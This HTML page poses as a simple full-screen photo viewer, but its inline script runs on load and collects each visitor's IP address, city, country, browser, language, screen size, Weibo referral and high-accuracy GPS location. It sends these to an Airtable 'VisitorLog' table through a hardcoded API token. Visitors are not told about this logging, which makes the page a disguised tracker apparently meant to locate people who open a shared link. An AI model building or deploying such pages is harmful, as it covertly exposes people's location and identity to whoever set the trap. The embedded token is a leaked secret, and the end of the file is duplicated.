<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>LYYSGC</title>
  <style>
    body {
      margin: 0;
      background-color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    img {
      max-width: 100%;
      max-height: 100%;
    }
  </style>
</head>
<body>
  <img src="main.jpg" alt="photo">
  
  <script>
    async function getVisitorData() {
      const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
      const userAgent = navigator.userAgent;
      const language = navigator.language;
      const screenSize = `${screen.width}x${screen.height}`;
      const isFromWeibo = userAgent.includes('Weibo');
      const referrer = document.referrer || '无';
      const time = new Date().toISOString();

      let latitude = null, longitude = null, accuracy = null;
      if ('geolocation' in navigator) {
        await new Promise(resolve => {
          navigator.geolocation.getCurrentPosition(
            pos => {
              latitude = pos.coords.latitude;
              longitude = pos.coords.longitude;
              accuracy = pos.coords.accuracy;
              resolve();
            },
            err => resolve(),
            { enableHighAccuracy: true, timeout: 5000 }
          );
        });
      }

      const dataToSend = {
        records: [
          {
            fields: {
              IP: ipData.ip,
              City: ipData.city,
              Country: ipData.country_name,
              Browser: userAgent,
              Language: language,
              Screen: screenSize,
              From_Weibo_App: isFromWeibo ? 'Yes' : 'No',
              Referrer: referrer,
              VisitTime: time,
              Latitude: latitude || '',
              Longitude: longitude || '',
              Accuracy_m: accuracy || ''
            }
          }
        ]
      };

      const token = 'patoKhBbgt8EdK21u.c964ef8f5b6ece2ca8e74c3751910365829974e8941cd5d17c6bf273c81a17b0';
      const baseId = 'appxay6O2SXyiCXEq';
      const tableName = 'VisitorLog';

      const response = await fetch(`https://api.airtable.com/v0/${baseId}/${encodeURIComponent(tableName)}`, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(dataToSend)
      });

      const result = await response.json();
      console.log('访客信息上传结果：', result);
    }

    getVisitorData();
  </script>
</body>
</html>


    getVisitorData();
  </script>
</body>
</html>
